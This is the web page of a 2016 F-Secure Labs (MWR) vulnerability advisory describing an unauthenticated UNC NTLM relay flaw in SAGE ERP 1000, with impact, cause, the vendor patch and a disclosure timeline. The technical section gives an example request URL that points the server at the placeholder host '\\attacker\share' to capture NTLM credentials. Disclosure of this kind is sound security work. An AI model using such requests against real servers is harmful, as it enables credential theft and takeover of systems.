<!DOCTYPE html>
<html lang="en-US">
<head>
    <base href="https://labs.f-secure.com/"><!--[if lte IE 6]></base><![endif]-->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
<meta name="x-subsite-id" content="1" />

    <title>SAGE ERP 1000 UNC NTLM Relay</title>

    <link rel="stylesheet" href="https://labs.f-secure.com/themes/mwr/css/style.css?t=20200715">
    <link rel="stylesheet" href="https://labs.f-secure.com/themes/labs/css/style.css?t=20200715">

    <meta name="description" content="">
    <link rel="canonical" href="https://labs.f-secure.com/advisories/sage-erp-1000/">
    <meta name="robots" content="NOODP,index,follow">

    

    <link rel="icon" href="favicon.ico" type="image/x-icon">
    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">

    <meta name="format-detection" content="telephone=no">
    
    <meta property="og:title" content="">
    <meta property="og:description" content="">
    <meta property="og:type" content="website">
    <meta property="og:site_name" content="F-Secure Labs">
    <meta property="og:url" content="https://labs.f-secure.com/advisories/sage-erp-1000/">
    
    <meta property="og:locale" content='en_GB'>
    <meta name="twitter:card" content="summary">
    
    <meta name="twitter:title" content="">
    <meta name="twitter:description" content="">

  <script>
    (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start': new Date().getTime(),event:'gtm.js'});
    var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;
    j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})
    (window,document,'script','dataLayer','GTM-KD9T85H');
  </script>
  <meta name="google-site-verification" content="jqRTM8I_uI-jDIu1ITng14jD-3iJy0l3TTCIl2I-BIo" />
<link rel="stylesheet" type="text/css" href="/themes/labs/css/style.css?m=1600760392" />
</head>
<body class="BlogPost" dir="ltr">

    <header class="head menu-opened" id="top">
	<div class="container">
		<div class="col12">
			<div class="logo">
				<a href="/">F-Secure</a>
			</div>
		    <a href="/advisories/sage-erp-1000/#nav" class="btn-menu">Menu</a>

<nav class="main-nav" itemscope itemtype="https://schema.org/SiteNavigationElement">
    <ul>
        
            <li class="section nav-advisories"><a href="/advisories/" title="Advisories">Advisories</a></li>
        
            <li class="link nav-blog"><a href="/blog/" title="/var/log/messages">/var/log/messages</a></li>
        
            <li class="link nav-publications"><a href="/publications/" title="Publications">Publications</a></li>
        
            <li class="link nav-tools"><a href="/tools/" title="Tools">Tools</a></li>
        
            <li class="link nav-archive"><a href="/archive/" title="Archive">Archive</a></li>
        
        <li class="nav-careers"><a href="https://www.f-secure.com/en/web/about_global/careers/job-openings">Careers</a></li>
    </ul>
</nav>

		</div>
	</div>
</header>


    <div class="wrapper">

        <section class="section">
  <div class="page-title">
    <div class="container">
      <span class="content-type">Advisories</span>
      <h1>SAGE ERP 1000 UNC NTLM Relay</h1>
      
      
    </div>
  </div>
</section>

<section class="section">
  <div class="container">
    <div class="col8">
      <div class="blog-post">
        
        <table>
          <tr>
            <td>Product</td>
            <td>SAGE ERP 1000</td>
          </tr>
          <tr>
            <td>Severity</td>
            <td>Medium</td>
          </tr>
          <tr>
            <td>CVE Reference</td>
            <td>N/A</td>
          </tr>
          <tr>
            <td>Type</td>
            <td>UNC NTLM Relay</td>
          </tr>
        </table>
        
        <h3>Description</h3>
<p>SAGE ERP 1000 <a href="/advisories/sage-erp-1000/#ref-sage">[1]</a><a href="advisories/2016/01/15/trend-micro-threat-intelligence-manager-arbitrary-code-execution/#fn1"></a> is a browser based combined ERP and CRM solution that covers finance, distribution, manufacturing, project accounting and services, time recording and billing.</p>
<p>During a security assessment for a MWR client, MWR identified a number of issues with the SAGE ERP 1000 product. To assist the client and to help other SAGE customers mitigate and/or remediate the risk exposure from the discovered issues, MWR reported the vulnerabilities to SAGE. This was done so in line with MWR's vulnerability disclosure policy (<a href="/vulnerability-disclosure-policy/">https://labs.mwrinfosecurity.com/vulnerability-disclosure-policy/</a>) and the agreement of MWR's client. Collectively the identified issues are due to insufficient input validation in the SAGE ERP 1000 product.</p>
<p>This advisory is in relation to the presence of a UNC NTLM Relay issue, which can be exploited from an unauthenticated vector.</p>
<h3>Impact</h3>
<p>The impact of the issue is highly dependent on the configuration and deployment of the SAGE ERP 1000 server as well as the environment it resides in. However, in the environment that the issue was discovered, it was possible to leverage the vulnerability to take control of the SAGE ERP 1000 server and access the supporting database and all of the data contained within, without providing authentication.</p>
<p>The vulnerability allows an attacker to capture and crack the provided hashed credentials and/or to forward them onto another server or service that supports NTLM authentication and authenticate as the user that the SAGE ERP 1000 server is running as. </p>
<h3>Cause</h3>
<p><span>The SAGE ERP 1000 application exposes an ASP script that does not require a user to be authenticated in order to interact with it. The script allows for UNC paths to be submitted that will be followed by the server. This class of vulnerability is often referred to as NTLM Relay, NTLM Reflection, NTLM Credential Forwarding, as well as SMB Relay/Reflection.</span></p>
<h3>Solution</h3>
<p>Apply the patch that is available from the vendor. More information can be found at the following location: <span><a href="https://my.sage.co.uk/public/help/enterprise/erp1000-line500.aspx#tabs-2">https://my.sage.co.uk/public/help/enterprise/erp1000-line500.aspx#tabs-2</a></span></p>
<h3>Technical Details</h3>
<p><span style="line-height: 1.4em;">The URLs for the vulnerable scripts are listed below:</span></p>
<ul><li><span style="line-height: 1.4em;">http://server/webclient/en-gb/_DBPLaunch.asp</span></li>
<li><span style="line-height: 1.4em;">http://server/webclient/en-gb/DBPLaunch.asp</span></li>
</ul><p><span style="line-height: 1.4em;">The scripts take a number of parameters from a user. These are shown below in the command output:</span> </p>
<pre>$ grep Request.QueryString DBPLaunch.asp<br><br>var filename = Request.QueryString('filename'); // The PDF name<br>var reportDefinitionPath = Request.QueryString('reportDefinitionPath'); // The SRD Definition name<br>var SID = Request.QueryString('SID');<br>var sage1000ErrorMessage = Request.QueryString('errorText');</pre>
<p> The parameters are as follows:</p>
<ul><li><span style="line-height: 1.4em;">filename</span></li>
<li><span>reportDefinitionPath</span></li>
<li><span>SID</span></li>
<li><span>sage1000ErrorMessage</span></li>
</ul><p><span style="line-height: 1.4em;">A valid URL is constructed as follows:</span></p>
<p><span style="line-height: 1.4em;">http://server/webclient/en-gb/DBPLaunch.asp?filename=&amp;reportDefinitionPath=&amp;SID=&amp;sage1000ErrorMessage=</span></p>
<p>The server will initiate a connection to a remote UNC share if a UNC path is provided to the ‘filename’ and/or ‘reportDefinitionPath’ parameters; other parameters can be left blank. For example, the following URL will cause the SAGE 1000 ERP server to initiate a connection to a system with the host name ‘attacker’ and a share with name of ‘share’ to retrieve the file 'FILE.txt':</p>
<p>http://server/webclient/en-gb/DBPLaunch.asp?filename=FILE.txt&amp;reportDefinitionPath=\\attacker\share&amp;SID=&amp;sage1000ErrorMessage=</p>
<p>There are many other locations within the application that are also potentially vulnerable to the same or similar issues. It is suspected that the application may be vulnerable to arbitrary file download and/or directory traversal vulnerabilities, as well as further UNC NTLM Relay style issues. As these issues were discovered during a client engagement, where a full product review of the SAGE ERP Solution was not the original scope of the project, limited time was available to fully investigate all possibilities.</p>
<p>There are many locations in the application that provide functionality that interacts with the file system, beyond the script DBLaunch.asp and _DBLaunch.asp. For example, the image below shows a function that allows for files to be moved from location to location:</p>
<p><img class="leftAlone" title="" src="assets/Uploads/_resampled/ResizedImage600344-sage-1.png" alt="sage 1" width="600" height="344"></p>
<p>The capture below shows that the library jcsp.dll is responsible for the functionality.</p>
<pre>POST /webclient/jcsp.dll?Comms&amp;__CS3SessionID3531453487883 HTTP/1.1<br>User-Agent: TetraInternal (WebClient 1.0 ; Java)<br>Content-Type: application/octet-stream<br>Accept-Language: en-gb<br>Host: &lt;redacted&gt;<br>Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2<br>Connection: keep-alive<br>Content-Length: 146<br>Authorization: &lt;redacted&gt;<br>Cookie: ASPSESSIONIDQAACSBTA=HPFDHGPALLNLNAIKJGOLJDEO<br><span style="line-height: 1.4em;"><br>MfcISAPICommand=Comms&amp;__CS3SessionID3531453487883......B.........<br></span>.....<br>.<br>.c.:.\.t.e.s.t.2.......<br>.......<br>.......<br>.c.:.\.t.e.s.t...........<br>......</pre>
<p><span style="color: #00f1a3; font-family: &#039;Source Code Pro&#039;, &#039;Lucida Grande&#039;, &#039;Lucida Sans Unicode&#039;, &#039;Lucida Sans&#039;, Geneva, Verdana, sans-serif; font-size: 1.5em; line-height: 1.2em;"> </span></p>
<p><span style="line-height: 1.4em;">SAGE have advised MWR that as well as investigating the reported issues and developing a patch to remedy, they </span><span class="s1">have tasked a security test team with applying further scrutiny to SAGE ERP 1000 with a view to identifying and resolving any further security problems. The intention being to complete the review a</span><span class="s1">head of the release of SAGE ERP 1000 V4 Service Pack 8 (scheduled July). Subject to the results of the review, further security updates may be included in that release.</span></p>
<p> </p>
<p><span style="color: #00f1a3; font-family: &#039;Source Code Pro&#039;, &#039;Lucida Grande&#039;, &#039;Lucida Sans Unicode&#039;, &#039;Lucida Sans&#039;, Geneva, Verdana, sans-serif; font-size: 1.5em; line-height: 1.2em;">Detailed Timeline</span></p>
<table cellspacing="0" cellpadding="0"><tbody><tr><td width="248" valign="top">
<p class="TableParagraph">Date</p>
</td>
<td width="603" valign="top">
<p class="TableParagraph">Summary</p>
</td>
</tr><tr><td style="text-align: left;" width="248" valign="top">
<p class="TableParagraph">01/02/2016</p>
</td>
<td width="603" valign="top">
<p class="TableParagraph"><span style="line-height: 1.4em;">vulnerability reported to SAGE.</span></p>
</td>
</tr><tr><td style="text-align: left;" width="248" valign="top">
<p class="TableParagraph">01/02/2016</p>
</td>
<td width="603" valign="top">
<p class="TableParagraph"><span style="line-height: 1.4em;">receipt of report confirmed by SAGE.</span></p>
</td>
</tr><tr><td style="text-align: left;" width="248" valign="top">
<p class="TableParagraph">04/02/2016</p>
</td>
<td width="603" valign="top">
<p>Progress updated volunteered by SAGE and a request for additional information received.</p>
</td>
</tr><tr><td style="text-align: left;" width="248" valign="top">
<p>04/02/2016</p>
</td>
<td width="603" valign="top">
<p>Additional information provided to SAGE by MWR.</p>
</td>
</tr><tr><td style="text-align: left;" width="248" valign="top">
<p>10/02/2016</p>
</td>
<td width="603" valign="top">
<p>Progress update provided unsolicited from SAGE confirming that a 'patch' is being worked on.</p>
</td>
</tr><tr><td style="text-align: left;" width="248" valign="top">
<p>22/02/2016</p>
</td>
<td width="603" valign="top">
<p>Update requested from SAGE by MWR.</p>
</td>
</tr><tr><td style="text-align: left;" width="248" valign="top">
<p>22/02/2016</p>
</td>
<td width="603" valign="top">
<p>Update provided confirming that a solution to the reported issues was still in progress - expected ETA for a patch is March.</p>
</td>
</tr><tr><td style="text-align: left;" width="248" valign="top">
<p>31/03/2016</p>
</td>
<td width="603" valign="top">
<p>SAGE advised that a patch will now be available for the latest releases by the end April rather than March. An advisory is due to be published by SAGE advertising the availability of the patches for ERP 1000 V4 Service Pack 7 and SAGE ERP 1000 V3 Service Pack 10. Expected publication date is w/c 04/04/2016</p>
</td>
</tr><tr><td style="text-align: left;" width="248" valign="top">
<p>04/04/2016</p>
</td>
<td width="603" valign="top">
<p>Vendor patch available. </p>
</td>
</tr></tbody></table><h3>References</h3>
<p><a name="ref-sage"></a>[1] <a href="http://www.sage.co.uk/cp/sage-1000">http://www.sage.co.uk/cp/sage-1000</a></p>
      </div>
      <div class="social-share">
        <p><span class="content-type">Share</span></p>
        <ul class="social">
  <li class="facebook"><a href="http://www.facebook.com/sharer.php?u=https://labs.f-secure.com/advisories/sage-erp-1000/" target="_blank">Share on Facebook</a></li>
  <li class="twitter"><a href="https://twitter.com/share?url=https://labs.f-secure.com/advisories/sage-erp-1000/&text=SAGE ERP 1000 UNC NTLM Relay" target="_blank">Share on LinkedIn</a></li>
  <li class="linkedin"><a href="http://www.linkedin.com/shareArticle?url=https://labs.f-secure.com/advisories/sage-erp-1000/&title=SAGE ERP 1000 UNC NTLM Relay" target="_blank">Share on Twitter</a></li>
</ul>

      </div>
    </div>
    <div class="col4">
      
      <a href="/assets/BlogFiles/mwri-sage-erp-1000-unc-ntml-relay-2016-04-04.pdf" class="flex-container__box">
            <span class="content-type">Download</span>
            
            <h3 class="flex-container__box-title">Download the advisory here.</h3>
            
      </a>
      

      
    </div>
  </section>

  <section class="section">
    <div class="container">
      <div class="col12">
        <p>&nbsp;</p>
      </div>
    </div>
  </section>


    </div>

    <footer class="foot">
	<div class="container">
    <div class="footer-flex-wrap">
     <p class="logo"><img src="https://labs.f-secure.com//themes/labs/img/fs-labs-logo-white.svg" alt="F-Secure" width="180" height="60"></p>
      <ul class="top-menu">
        <li><a href="/advisories/sage-erp-1000/#top" class="btn-gototop">Top</a></li>
        
        <li class="link"><a href="https://www.f-secure.com/en/consulting/contact">Contact</a></li>
        
        
      </ul>
   </div>
   <hr/>
    <div class="col5 suf1 foot-about">
      <p>F-Secure provides specialist advice and solutions in all areas of cyber security, from professional and managed services, through to developing commercial and open source security tools.  </p>
    </div>
    <div class="col3">
      <ul class="footer-list no-margin">
        
        <li><a href="/publications/ti-report-lazarus-group-cryptocurrency-vertical/">Threat Intelligence Report: Lazarus Group Campaign Targeting the Cryptocurrency Vertical</a></li>
        
        <li><a href="/publications/the-fake-cisco/">The Fake Cisco</a></li>
        
        <li><a href="/publications/u-booting-securely/">U-Booting securely</a></li>
        
      </ul>
    </div>
    <div class="col3">
     <ul class="footer-list">
      
      <li><a href="/blog/prelude-to-ransomware-systembc/">Prelude to Ransomware: SystemBC</a></li>
      
      <li><a href="/blog/attack-detection-fundamentals-2021-azure-lab-3/">Attack Detection Fundamentals 2021: Azure - Lab #3</a></li>
      
      <li><a href="/blog/attack-detection-fundamentals-2021-azure-lab-2/">Attack Detection Fundamentals 2021: Azure - Lab #2</a></li>
      
    </ul>
  </div>
</div>
<div class="end">
 <div class="container">
  <hr/>
  <div class="footer-flex-wrap">
   <p class="copyright">Copyright &copy; 2021 F-Secure</p>
    <ul class="social">
      
      <li class="linkedin for-footer"><a href="https://www.linkedin.com/showcase/28493188" target="_blank">Connect with us on LinkedIn</a></li>
      
      
      <li class="twitter for-footer"><a href="https://twitter.com/fsecurelabs" target="_blank">Follow us on Twitter</a></li>
      
      
      <li class="github for-footer"><a href="https://github.com/fsecurelabs" target="_blank">Follow us on GitHub</a></li>
      
    </ul>
 </div>
</div>
</div>
</footer>

    <script src="/themes/mwr/js/min/jquery-3.5.1.min.js" id="jqueryscript"></script>

    
    <script src="/themes/mwr/js/min/slides.min.js"></script>
    

    <script src="/themes/mwr/js/min/scripts.js?20190917" id="pagescripts"></script>

    <script type="application/ld+json">
    { "@context" : "http://schema.org",
      "@type" : "Organization",
      "name" : "F-Secure Labs",
      "url" : "https://labs.f-secure.com",
      "logo" : "https://labs.f-secure.com/themes/labs/img/fs-labs-logo-white.svg",
      "sameAs" : [
          "https://twitter.com/fsecurelabs",
          "https://www.linkedin.com/showcase/28493188"],
      "contactPoint" : [
        { "@type" : "ContactPoint",
          "telephone" : "+441256300920",
          "contactType" : "customer service"
        } ]
    }
    </script>
</body>
</html>
